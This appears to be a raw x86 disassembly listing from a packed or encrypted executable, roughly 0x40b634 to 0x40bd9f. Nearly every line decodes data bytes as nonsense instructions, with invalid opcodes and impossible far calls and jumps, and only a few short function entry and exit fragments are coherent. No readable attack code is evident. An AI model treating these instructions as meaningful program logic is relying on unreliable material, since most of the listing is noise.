  40b634:	xor    eax,0xf9d56bb6
  40b639:	pusha  
  40b63a:	mov    DWORD PTR [ebx+ebp*1+0xfcd1990],edi
  40b641:	xchg   esp,eax
  40b642:	or     ecx,DWORD PTR [ecx-0x66]
  40b645:	shl    DWORD PTR [esi-0x7f],cl
  40b648:	js     0x40b628
  40b64a:	int3   
  40b64b:	int3   
  40b64c:	lds    edx,FWORD PTR [ebp-0x10]
  40b64f:	push   edx
  40b650:	std    
  40b651:	cld    
  40b652:	mov    bl,0xcb
  40b654:	mov    esi,0x18e91c1a
  40b659:	pop    edi
  40b65a:	lods   eax,DWORD PTR cs:[esi]
  40b65c:	sub    eax,0xfff843b0
  40b661:	sub    al,0xb3
  40b663:	or     BYTE PTR [ecx+0x60ae1955],0x6e
  40b66a:	stos   BYTE PTR es:[edi],al
  40b66b:	pop    ebx
  40b66c:	cld    
  40b66d:	(bad)  
  40b66e:	out    dx,al
  40b66f:	imul   BYTE PTR [eax+0x68]
  40b672:	pop    ebp
  40b673:	add    esp,ebx
  40b675:	cmc    
  40b676:	fwait
  40b677:	mov    bl,0x1
  40b679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b67a:	mov    ss,WORD PTR [ebp-0x4df50885]
  40b680:	xlat   BYTE PTR ds:[ebx]
  40b681:	fdivr  st(5),st
  40b683:	mov    eax,0x8b0c408b
  40b688:	or     ecx,ebp
  40b68a:	mov    bl,0x1
  40b68c:	add    BYTE PTR [eax],al
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    esp,DWORD PTR [esi-0x4d]
  40b69c:	sub    esp,DWORD PTR [ecx+0x2a]
  40b69f:	repz jo 0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b6e0
  40b6a7:	xchg   esi,eax
  40b6a8:	mov    ds:0xee2694ea,al
  40b6ad:	std    
  40b6ae:	jge    0x40b68c
  40b6b0:	sar    DWORD PTR [ebp-0x70],0xdc
  40b6b4:	ror    BYTE PTR [ebx],1
  40b6b6:	retf   0x28d2
  40b6b9:	lds    ebp,FWORD PTR [esi-0x1a]
  40b6bc:	cmp    DWORD PTR [ecx+0x76],esi
  40b6bf:	xchg   edx,eax
  40b6c0:	bound  ecx,QWORD PTR [ecx-0x63]
  40b6c3:	lods   eax,DWORD PTR ds:[esi]
  40b6c4:	dec    eax
  40b6c5:	inc    edi
  40b6c6:	fwait
  40b6c7:	mov    cl,0x3a
  40b6c9:	mov    edx,0x9955d776
  40b6ce:	mov    edi,0xa102bba2
  40b6d3:	fcom   st(7)
  40b6d5:	and    eax,0x956fc056
  40b6da:	clc    
  40b6db:	inc    edi
  40b6dc:	adc    eax,esp
  40b6de:	fidiv  DWORD PTR [edi-0x4d]
  40b6e1:	(bad)  
  40b6e2:	xchg   edi,eax
  40b6e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6e4:	arpl   WORD PTR [eax-0x2c],si
  40b6e7:	fidiv  DWORD PTR [edi]
  40b6e9:	mov    eax,0xcee9b8c8
  40b6ee:	cmp    bl,BYTE PTR [ecx+0xe]
  40b6f1:	push   eax
  40b6f2:	add    DWORD PTR [ebx+0x3ed81461],edx
  40b6f8:	scas   al,BYTE PTR es:[edi]
  40b6f9:	scas   eax,DWORD PTR es:[edi]
  40b6fa:	fld    TBYTE PTR [ebp+0x72fe3566]
  40b700:	repz and eax,0x46ec11df
  40b706:	fistp  QWORD PTR [ebp-0x15e996a2]
  40b70c:	xchg   esi,eax
  40b70d:	sbb    DWORD PTR ds:0xcd499a82,0x68
  40b714:	pop    esi
  40b715:	inc    ebx
  40b716:	sub    al,0x77
  40b718:	cmp    esp,DWORD PTR [esp+edi*4-0x4a]
  40b71c:	cwde   
  40b71d:	push   edi
  40b71e:	in     eax,0x6b
  40b720:	imul   esi,DWORD PTR [esp+ecx*4-0x2f],0xfffffff1
  40b725:	push   ebp
  40b726:	in     al,0xb8
  40b728:	mov    ebx,0x4dfdf6a3
  40b72d:	pusha  
  40b72e:	mov    al,ds:0x72a58aef
  40b733:	push   esp
  40b734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b735:	adc    esi,DWORD PTR [edi]
  40b737:	sbb    eax,0xf2907422
  40b73c:	mov    esp,0x7edd0a9a
  40b741:	jno    0x40b724
  40b743:	(bad)  
  40b744:	shl    BYTE PTR [ebx-0x16],cl
  40b747:	xlat   BYTE PTR ds:[ebx]
  40b748:	fldcw  WORD PTR [ecx+0x1d]
  40b74b:	xchg   DWORD PTR [eax],esp
  40b74d:	rcr    BYTE PTR [eax-0x38d1dc6b],0xdf
  40b754:	outs   dx,BYTE PTR ds:[esi]
  40b755:	or     eax,0x8300696
  40b75a:	lahf   
  40b75b:	jmp    0x40b7a1
  40b75d:	mov    ah,BYTE PTR [edx+0xdda8f8e]
  40b763:	pop    ecx
  40b764:	xchg   edi,eax
  40b765:	mov    ecx,0xdef8a277
  40b76a:	cmovbe esp,DWORD PTR [edx]
  40b76d:	push   ebp
  40b76e:	pop    esi
  40b76f:	mov    ebx,0xffc62c77
  40b774:	dec    edx
  40b775:	push   eax
  40b776:	and    eax,0xa062fa52
  40b77b:	push   edi
  40b77c:	inc    eax
  40b77d:	jbe    0x40b788
  40b77f:	out    dx,al
  40b780:	add    al,0xa4
  40b782:	adc    dh,al
  40b784:	mov    cl,0x71
  40b786:	push   edi
  40b787:	push   0x641954cc
  40b78c:	nop
  40b78d:	xor    BYTE PTR [eax-0x22204df6],ch
  40b793:	push   edi
  40b794:	call   0x8d85d2ff
  40b799:	cmc    
  40b79a:	mov    al,BYTE PTR [esi+ebp*1-0x3b67edc0]
  40b7a1:	mov    esi,0x3a7a8034
  40b7a6:	mov    ch,ch
  40b7a8:	mov    DWORD PTR [ebx],ebx
  40b7aa:	arpl   WORD PTR [edi+0x6b],bx
  40b7ad:	cli    
  40b7ae:	call   0x78fa:0x5c7b17cb
  40b7b5:	sbb    bl,BYTE PTR [ecx+0x22]
  40b7b8:	inc    ebp
  40b7b9:	int    0xea
  40b7bb:	push   eax
  40b7bc:	fs inc edx
  40b7be:	jge    0x40b780
  40b7c0:	cmp    dh,BYTE PTR [ecx]
  40b7c2:	pop    edi
  40b7c3:	or     esp,DWORD PTR [edi-0x73ecc635]
  40b7c9:	sub    eax,0xfa3c9c0d
  40b7ce:	or     BYTE PTR [eax-0x4622f661],ch
  40b7d4:	(bad)  
  40b7d5:	data16 jb 0x40b81f
  40b7d8:	mov    ebp,DWORD PTR [esi]
  40b7da:	xor    BYTE PTR [ebx+0x1],bh
  40b7dd:	jne    0x40b76d
  40b7df:	nop
  40b7e0:	xchg   esi,eax
  40b7e1:	pop    edx
  40b7e2:	daa    
  40b7e3:	pop    ecx
  40b7e4:	push   0xdc0e342f
  40b7e9:	mov    bl,0x6e
  40b7eb:	out    0x43,eax
  40b7ed:	or     al,0xdb
  40b7ef:	inc    esp
  40b7f0:	mov    dh,0xa9
  40b7f2:	fldcw  WORD PTR [ebx-0x68]
  40b7f5:	push   ss
  40b7f6:	out    dx,eax
  40b7f7:	fild   WORD PTR [edi-0x75]
  40b7fa:	retf   
  40b7fb:	mov    ebp,0xb85328bc
  40b800:	xor    ah,BYTE PTR [esp+edx*8]
  40b803:	into   
  40b804:	pop    edi
  40b805:	test   al,0x6a
  40b807:	cmp    edx,esp
  40b809:	les    esp,FWORD PTR [eax+0x451619a5]
  40b80f:	push   ecx
  40b810:	lea    ebx,[edi]
  40b812:	pop    esp
  40b813:	add    al,0x3f
  40b815:	daa    
  40b816:	call   0x9feb:0xa4e04ed8
  40b81d:	into   
  40b81e:	jg     0x40b7c1
  40b820:	in     eax,0xac
  40b822:	adc    al,BYTE PTR [edi+0x60e66ebe]
  40b828:	xor    ecx,DWORD PTR [edi]
  40b82a:	cmp    DWORD PTR ds:0xe8176bbd,edi
  40b830:	inc    esi
  40b831:	popf   
  40b832:	nop
  40b833:	adc    DWORD PTR [edi+edx*4+0x5fb4a2f4],edi
  40b83a:	add    esp,DWORD PTR [ebp-0xbd888c2]
  40b840:	sbb    DWORD PTR [edx+0x37040804],ecx
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	dec    ecx
  40b858:	mov    ebx,0xf24f94ee
  40b85d:	jo     0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b89e
  40b864:	mov    BYTE PTR [ebp+edx*4+0x43],dh
  40b868:	xor    ebp,esi
  40b86a:	sti    
  40b86b:	lea    edx,[esi-0x36d1a6de]
  40b871:	(bad)  [ebp+ebp*8-0x551368e2]
  40b878:	mov    esp,0x4e501c94
  40b87d:	pop    ds
  40b87e:	and    ah,ch
  40b880:	adc    eax,0xe8715cf8
  40b885:	iret   
  40b886:	sbb    BYTE PTR [edi+0x54bed805],0xa8
  40b88d:	adc    edi,DWORD PTR [ecx]
  40b88f:	dec    eax
  40b890:	rcl    bh,0x97
  40b893:	adc    ah,BYTE PTR [eax-0x41]
  40b896:	push   es
  40b897:	add    bl,ch
  40b899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b89a:	xor    DWORD PTR [ebp-0x2a],esp
  40b89d:	inc    eax
  40b89e:	cmp    BYTE PTR ds:[ebx+0x66],ah
  40b8a2:	jge    0x40b825
  40b8a4:	pop    eax
  40b8a5:	mov    dl,0x65
  40b8a7:	mov    ds:0x78fe7f55,al
  40b8ac:	adc    eax,0xbcc013cb
  40b8b1:	ficomp DWORD PTR [ebx+0x19f8b58f]
  40b8b7:	push   ss
  40b8b8:	icebp  
  40b8b9:	ins    DWORD PTR es:[edi],dx
  40b8ba:	ds push esi
  40b8bc:	mov    BYTE PTR [ebp+0x51],dh
  40b8bf:	inc    esp
  40b8c0:	and    DWORD PTR [ecx+0x8],0x50df2fda
  40b8c7:	and    bh,BYTE PTR [ebx-0x7b53f39]
  40b8cd:	fwait
  40b8ce:	scas   al,BYTE PTR es:[edi]
  40b8cf:	shr    BYTE PTR ds:0x36116485,1
  40b8d5:	je     0x40b8ab
  40b8d7:	sbb    dl,BYTE PTR ss:[ecx-0x2f105372]
  40b8de:	shl    ah,1
  40b8e0:	push   esp
  40b8e1:	and    eax,0x75690ab6
  40b8e6:	faddp  st(7),st
  40b8e8:	mov    esi,0x92a9cbfe
  40b8ed:	mov    ch,0xf
  40b8ef:	rcl    BYTE PTR ds:0x5f44d7f9,cl
  40b8f5:	add    bh,BYTE PTR es:[esi]
  40b8f8:	mov    ecx,0xa27f62e1
  40b8fd:	or     BYTE PTR [ebp+eax*4+0x58887c08],ah
  40b904:	inc    eax
  40b905:	or     bh,dl
  40b907:	(bad)
  40b90a:	adc    BYTE PTR [esp+ebx*1+0x57543555],dl
  40b911:	inc    ebx
  40b912:	or     al,0x88
  40b914:	fcomp  DWORD PTR ds:0x42ce9c1e
  40b91a:	lds    edx,FWORD PTR [ebp+edx*1-0x24]
  40b91e:	ds das 
  40b920:	mov    ch,0xde
  40b922:	stos   DWORD PTR es:[edi],eax
  40b923:	es shl bl,1
  40b926:	pusha  
  40b927:	jl     0x40b8f5
  40b929:	shr    esi,cl
  40b92b:	into   
  40b92c:	out    0xb4,eax
  40b92e:	pop    eax
  40b92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b930:	push   esi
  40b931:	cmp    bl,BYTE PTR [eax-0x3eb14656]
  40b937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b938:	repz hlt 
  40b93a:	push   edi
  40b93b:	inc    edx
  40b93c:	bound  ebx,QWORD PTR [edi+ebx*8]
  40b93f:	hlt    
  40b940:	test   edx,edi
  40b942:	jmp    0x40b900
  40b944:	pop    es
  40b945:	rcr    BYTE PTR [ebx+0x46],1
  40b948:	int    0x10
  40b94a:	(bad)  
  40b94c:	aaa    
  40b94d:	rcl    DWORD PTR [esi+edi*8-0x6d],1
  40b951:	xlat   BYTE PTR ds:[ebx]
  40b952:	out    dx,eax
  40b953:	jge    0x40b990
  40b955:	sbb    dl,BYTE PTR [esi-0x11]
  40b958:	mov    bh,BYTE PTR [ebx-0x44ecdcbf]
  40b95e:	cli    
  40b95f:	in     eax,dx
  40b960:	jne    0x40b959
  40b962:	nop
  40b963:	inc    edi
  40b964:	add    al,0x54
  40b966:	stc    
  40b967:	out    0x5a,al
  40b969:	xor    bh,dl
  40b96b:	(bad)  
  40b96c:	jb     0x40b9b3
  40b96e:	jns    0x40b951
  40b970:	adc    al,0x4a
  40b972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b973:	std    
  40b974:	mov    esi,0x416a1b12
  40b979:	or     eax,DWORD PTR [eax]
  40b97b:	leave  
  40b97c:	stos   DWORD PTR es:[edi],eax
  40b97d:	jns    0x40b915
  40b97f:	xchg   esi,eax
  40b980:	push   0xffffffb8
  40b982:	sar    dh,cl
  40b984:	lea    edx,[esi-0x2fde83ac]
  40b98a:	aad    0x29
  40b98c:	jns    0x40b92b
  40b98e:	lahf   
  40b98f:	fnsave [eax-0x40]
  40b992:	pushf  
  40b993:	(bad)  
  40b994:	in     al,dx
  40b995:	jae    0x40b9c5
  40b997:	mov    al,ds:0x40eace39
  40b99c:	adc    al,0x3e
  40b99e:	out    dx,al
  40b99f:	iret   
  40b9a0:	dec    esp
  40b9a1:	mov    ah,0x1e
  40b9a3:	mov    esp,0x18df14f5
  40b9a8:	(bad)  
  40b9a9:	cmp    eax,0x2179d3f5
  40b9ae:	push   esi
  40b9af:	fnstcw WORD PTR [ecx]
  40b9b1:	adc    al,0x23
  40b9b3:	stos   BYTE PTR es:[edi],al
  40b9b4:	mov    esp,0x7bff8c59
  40b9b9:	mov    ah,0x99
  40b9bb:	sbb    ch,BYTE PTR [edx+0x4d]
  40b9be:	rcl    edi,0x42
  40b9c1:	pop    ds
  40b9c2:	adc    ecx,esp
  40b9c4:	sahf   
  40b9c5:	hlt    
  40b9c6:	xchg   edx,eax
  40b9c7:	sub    eax,0xa62cfd8
  40b9cc:	hlt    
  40b9cd:	mov    BYTE PTR [esi],dh
  40b9cf:	fdivr  DWORD PTR [ebx+0x29]
  40b9d2:	mov    dh,0x84
  40b9d4:	pusha  
  40b9d5:	mov    al,0x48
  40b9d7:	fisubr WORD PTR gs:[edx+0x10660347]
  40b9de:	mov    ds:0x92a0e71d,al
  40b9e3:	test   DWORD PTR [eax],0xa248b8d5
  40b9e9:	xchg   edi,eax
  40b9ea:	mov    ds:0xdd42e8d1,al
  40b9ef:	pop    ebp
  40b9f0:	aad    0xd1
  40b9f2:	(bad)  
  40b9f3:	sub    bl,dl
  40b9f5:	dec    ebx
  40b9f6:	sar    ah,1
  40b9f8:	add    bh,BYTE PTR [eax]
  40b9fa:	aam    0x8f
  40b9fc:	push   ebp
  40b9fd:	mov    esi,DWORD PTR [edi+eax*2]
  40ba00:	cmp    al,0xc5
  40ba02:	je     0x40ba19
  40ba08:	mov    eax,DWORD PTR [ebp+0x8]
  40ba0b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0x8ba70d6b
  40ba45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba46:	mov    esi,0x7070f0e4
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40baae
  40ba50:	test   al,0x18
  40ba52:	(bad)  
  40ba53:	pushf  
  40ba54:	sub    ebx,DWORD PTR [ebx-0x17]
  40ba57:	fs mov al,0x40
  40ba5a:	mov    ah,0x82
  40ba5c:	sbb    al,0x9d
  40ba5e:	and    al,0xbd
  40ba60:	(bad)  
  40ba61:	jp     0x40babe
  40ba63:	in     eax,0xa8
  40ba65:	and    BYTE PTR [ecx-0x3e],ch
  40ba68:	dec    edx
  40ba69:	xchg   ebx,eax
  40ba6a:	ror    BYTE PTR [edi+ebp*8],0x83
  40ba6e:	sbb    eax,0xbdd96ba6
  40ba73:	ss add eax,0xa8c085d9
  40ba79:	fs cmp ebx,esi
  40ba7c:	cdq    
  40ba7d:	(bad)  
  40ba7e:	xchg   esp,eax
  40ba7f:	test   BYTE PTR [ebp+eiz*4-0x11],ah
  40ba83:	mov    ds:0x5537d03b,al
  40ba88:	sar    ecx,0x30
  40ba8b:	dec    ebp
  40ba8c:	mov    dh,0xd8
  40ba8e:	shr    ebp,0xd5
  40ba91:	int    0xbe
  40ba93:	mov    al,0x62
  40ba95:	pop    ecx
  40ba96:	xlat   BYTE PTR ds:[ebx]
  40ba97:	addr16 das 
  40ba99:	push   ebp
  40ba9a:	push   0xffffffa4
  40ba9c:	inc    eax
  40ba9d:	std    
  40ba9e:	out    0x2,eax
  40baa0:	rol    ebp,0x24
  40baa3:	in     eax,0x9a
  40baa5:	fs sub al,0x49
  40baa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baa9:	aaa    
  40baaa:	dec    esi
  40baab:	adc    BYTE PTR [esp+ecx*8],0x2
  40baaf:	xchg   esp,eax
  40bab0:	mov    esp,DWORD PTR [ebx]
  40bab2:	clc    
  40bab3:	or     esp,ebx
  40bab5:	(bad)  
  40bab6:	idiv   BYTE PTR [ebp-0x7946cb0b]
  40babc:	test   al,0xdb
  40babe:	jne    0x40baf7
  40bac0:	inc    ebp
  40bac1:	sar    ebp,0x1b
  40bac4:	icebp  
  40bac5:	add    al,0xdc
  40bac7:	pop    esp
  40bac8:	loope  0x40ba94
  40baca:	add    al,0x1f
  40bacc:	fidiv  WORD PTR [eax+0x2d10387b]
  40bad2:	in     eax,dx
  40bad3:	mov    edi,0x62c8763f
  40bad8:	push   edi
  40bad9:	std    
  40bada:	pop    ebx
  40badb:	test   al,0xa6
  40badd:	jg     0x40bb1e
  40badf:	sbb    DWORD PTR [ecx+0x2c],edx
  40bae2:	or     eax,0xa51ebec2
  40bae7:	cmp    DWORD PTR [eax-0x2341b901],edi
  40baed:	jno    0x40bb18
  40baef:	push   esp
  40baf0:	aam    0xef
  40baf2:	jmp    edi
  40baf4:	cli    
  40baf5:	stos   DWORD PTR es:[edi],eax
  40baf6:	fst    DWORD PTR [edx+0x49]
  40baf9:	dec    esi
  40bafa:	es ins DWORD PTR es:[edi],dx
  40bafc:	sub    DWORD PTR [edi+0x9],esi
  40baff:	stc    
  40bb00:	lods   al,BYTE PTR ds:[esi]
  40bb01:	and    al,0xad
  40bb03:	adc    DWORD PTR [esi-0x723dcb3b],ebx
  40bb09:	sbb    eax,0xaa48028b
  40bb0e:	bound  ebx,QWORD PTR [eax]
  40bb10:	and    DWORD PTR [edx-0x11],esi
  40bb13:	mov    ecx,DWORD PTR [ebx]
  40bb15:	add    eax,0x2bb75d2c
  40bb1a:	sbb    edx,0xffffff97
  40bb1d:	and    esi,edi
  40bb1f:	jmp    0xedb5f3c3
  40bb24:	mov    esp,0x68ef1d8e
  40bb29:	imul   esi,DWORD PTR [edx+0x3aea7e79],0xc3a6702a
  40bb33:	hlt    
  40bb34:	mov    bl,0xfd
  40bb36:	jnp    0x40baf2
  40bb38:	add    BYTE PTR [esi-0x35],cl
  40bb3b:	sub    ebx,DWORD PTR [eax]
  40bb3d:	jmp    0x40bb82
  40bb3f:	dec    edx
  40bb40:	loopne 0x40bbaf
  40bb42:	shr    edx,1
  40bb44:	sub    BYTE PTR [esi-0x4e177527],0xb3
  40bb4b:	or     dh,BYTE PTR [ebx+0x4c4d4612]
  40bb51:	popa   
  40bb52:	jae    0x40bb7f
  40bb54:	xchg   edx,eax
  40bb55:	into   
  40bb56:	push   edx
  40bb57:	jb     0x40bb74
  40bb59:	je     0x40bbb6
  40bb5b:	add    ch,BYTE PTR [eax+0x46b0ae93]
  40bb61:	enter  0x89f8,0x53
  40bb65:	mov    edi,0xd1e1e5db
  40bb6a:	shl    BYTE PTR [edi-0x4d21adee],0x2
  40bb71:	mov    eax,ds:0x8347ef0d
  40bb76:	cmp    BYTE PTR [edx],bl
  40bb78:	xor    ebx,edi
  40bb7a:	test   DWORD PTR [ebx],eax
  40bb7c:	pusha  
  40bb7d:	jp     0x40bb45
  40bb7f:	pushf  
  40bb80:	jno    0x40bb9f
  40bb82:	add    DWORD PTR [ebx],0x59
  40bb85:	sbb    al,0xfb
  40bb87:	bnd jb 0x40bb83
  40bb8a:	pop    edi
  40bb8b:	std    
  40bb8c:	xchg   BYTE PTR [bx+si+0x6c],ch
  40bb90:	push   ecx
  40bb91:	inc    edx
  40bb92:	fmul   st,st(2)
  40bb94:	lods   eax,DWORD PTR ds:[esi]
  40bb95:	jne    0x40bb7d
  40bb97:	daa    
  40bb98:	xlat   BYTE PTR fs:[ebx]
  40bb9a:	retf   
  40bb9b:	sar    DWORD PTR [ebp-0x45],0x52
  40bb9f:	sub    edx,DWORD PTR [edx-0x4f424dd2]
  40bba5:	lods   eax,DWORD PTR ds:[esi]
  40bba6:	jnp    0x40bb66
  40bba8:	xor    DWORD PTR [esi-0x4b],0x26
  40bbac:	addr16 cmc 
  40bbae:	out    dx,al
  40bbaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbb0:	std    
  40bbb1:	sub    eax,esi
  40bbb3:	scas   al,BYTE PTR es:[edi]
  40bbb4:	and    eax,0x616ddf21
  40bbb9:	clc    
  40bbba:	xchg   ebp,eax
  40bbbb:	je     0x40bbe2
  40bbbd:	adc    al,0x82
  40bbbf:	mov    ds:0x5d94f635,eax
  40bbc4:	cmp    BYTE PTR [edx-0x138f9fe8],ah
  40bbca:	enter  0x65cc,0x24
  40bbce:	mov    ds:0x86b7882b,eax
  40bbd3:	adc    al,0xd3
  40bbd5:	mov    DWORD PTR [eax],ebx
  40bbd7:	sbb    dh,BYTE PTR [esi+edx*1-0x45]
  40bbdb:	pushf  
  40bbdc:	jnp    0x40bc4a
  40bbde:	test   al,0x26
  40bbe0:	sub    al,0x1
  40bbe2:	inc    ebp
  40bbe3:	mov    ebx,0xe4381b5c
  40bbe8:	adc    eax,DWORD PTR [ebx-0x75]
  40bbeb:	inc    ebp
  40bbec:	or     bh,bh
  40bbee:	jne    0x40bbe8
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43439a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434392
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434415,0x432dbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax+0x4b712f54],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	pop    esi
  40bc4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc4f:	sub    ah,dl
  40bc51:	push   cs
  40bc52:	inc    ebx
  40bc53:	int3   
  40bc54:	cmp    ch,bl
  40bc56:	(bad)
  40bc5a:	imul   bl
  40bc5c:	retf   0x24ff
  40bc5f:	xchg   ecx,eax
  40bc60:	pusha  
  40bc61:	repnz xor ax,0xe338
  40bc66:	mov    dl,0x82
  40bc68:	jo     0x40bc5e
  40bc6a:	aam    0x8a
  40bc6c:	sub    DWORD PTR [ebx-0x62d7fe32],edx
  40bc72:	shl    BYTE PTR [esi+0x2e],1
  40bc75:	fwait
  40bc76:	cmp    eax,0xb3a04d01
  40bc7b:	sbb    eax,0xf8062135
  40bc80:	inc    esi
  40bc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc82:	imul   ecx,ecx,0x13
  40bc85:	jmp    0xea3:0x3e57ffba
  40bc8c:	imul   ecx,edx,0xfb44f487
  40bc92:	into   
  40bc93:	and    eax,0x3c089bbb
  40bc98:	sbb    esp,esp
  40bc9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc9b:	xchg   ecx,eax
  40bc9c:	xor    edx,DWORD PTR [esi+0x5f8ba39e]
  40bca2:	out    dx,eax
  40bca3:	push   cs
  40bca4:	sbb    BYTE PTR [eax],ah
  40bca6:	pop    ebx
  40bca7:	inc    eax
  40bca8:	lods   al,BYTE PTR ds:[esi]
  40bca9:	cmc    
  40bcaa:	push   DWORD PTR [edi]
  40bcac:	add    esp,ecx
  40bcae:	and    BYTE PTR [ecx+0x12],dh
  40bcb1:	pop    esp
  40bcb2:	lahf   
  40bcb3:	xor    eax,0xcd93cbb4
  40bcb8:	xchg   edx,eax
  40bcb9:	push   eax
  40bcba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcbb:	ss in  eax,dx
  40bcbd:	iret   
  40bcbe:	je     0x40bd22
  40bcc0:	cld    
  40bcc1:	dec    ebx
  40bcc2:	sub    eax,0x1e7980fd
  40bcc7:	inc    esi
  40bcc8:	and    al,0x51
  40bcca:	push   0xda022613
  40bccf:	cmp    edx,eax
  40bcd1:	into   
  40bcd2:	cmp    al,BYTE PTR [edi]
  40bcd4:	jbe    0x40bc7f
  40bcd6:	inc    ecx
  40bcd7:	test   al,0x99
  40bcd9:	xor    BYTE PTR [edi-0x2801fcb5],bl
  40bcdf:	daa    
  40bce0:	sbb    esi,DWORD PTR ds:0x68e93960
  40bce6:	jnp    0x40bceb
  40bce8:	sti    
  40bce9:	(bad)  
  40bcea:	std    
  40bceb:	jg     0x40bd1e
  40bced:	mov    ch,0x5e
  40bcef:	push   edx
  40bcf0:	mov    BYTE PTR [ebx-0x2c1c31c4],cl
  40bcf6:	shl    DWORD PTR [edi+0x0],cl
  40bcf9:	gs push ebp
  40bcfb:	js     0x40bca0
  40bcfd:	fwait
  40bcfe:	xor    eax,0x9f251043
  40bd03:	pop    ecx
  40bd04:	ret    
  40bd05:	dec    eax
  40bd06:	or     al,0xba
  40bd08:	call   0x32fcfa2a
  40bd0d:	lahf   
  40bd0e:	cmp    eax,0xbe945dee
  40bd13:	push   ecx
  40bd14:	clc    
  40bd15:	fscale 
  40bd17:	std    
  40bd18:	sbb    eax,0x21049e0e
  40bd1d:	out    dx,eax
  40bd1e:	dec    esp
  40bd1f:	dec    edi
  40bd20:	call   0x7c4f:0x690e77c1
  40bd27:	mov    edi,0x7b78e15d
  40bd2c:	push   0x35
  40bd2e:	cmp    al,0xf8
  40bd30:	cli    
  40bd31:	outs   dx,BYTE PTR ds:[esi]
  40bd32:	ja     0x40bcc9
  40bd34:	sbb    edi,DWORD PTR [esi+0x7ebffe67]
  40bd3a:	sub    ecx,DWORD PTR [edi-0x5ef4d179]
  40bd40:	xor    BYTE PTR [eax-0x22],ch
  40bd43:	cmp    al,0x67
  40bd45:	cmp    DWORD PTR [esi],0x8cf49b08
  40bd4b:	ret    0xa34c
  40bd4e:	mov    cl,0x59
  40bd50:	fcmovnb st,st(5)
  40bd52:	dec    eax
  40bd53:	repz das 
  40bd55:	daa    
  40bd56:	dec    esi
  40bd57:	in     al,dx
  40bd58:	mov    ds:0x1a2db930,eax
  40bd5d:	jmp    0x96fbb2d3
  40bd62:	cmp    al,0x76
  40bd64:	dec    ecx
  40bd65:	out    dx,eax
  40bd66:	xchg   ebp,eax
  40bd67:	mov    ebx,0xb11097a3
  40bd6c:	mov    edi,eax
  40bd6e:	adc    ebx,esp
  40bd70:	addr16 cwde 
  40bd72:	mov    ebp,ds
  40bd74:	or     al,0x82
  40bd76:	mov    ebp,0xad6250e5
  40bd7b:	inc    ebp
  40bd7c:	xlat   BYTE PTR ds:[ebx]
  40bd7d:	test   BYTE PTR [esi],ah
  40bd7f:	pop    eax
  40bd80:	mov    ebx,0x6247ef3a
  40bd85:	xchg   edx,edx
  40bd87:	or     ecx,ebx
  40bd89:	push   eax
  40bd8a:	sbb    DWORD PTR [edx-0x1b6c40f3],edi
  40bd90:	jl     0x40bd59
  40bd92:	adc    eax,0x3a9ea9d3
  40bd97:	add    ebx,esi
  40bd99:	add    eax,0xe479f87f
  40bd9e:	std    
  40bd9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
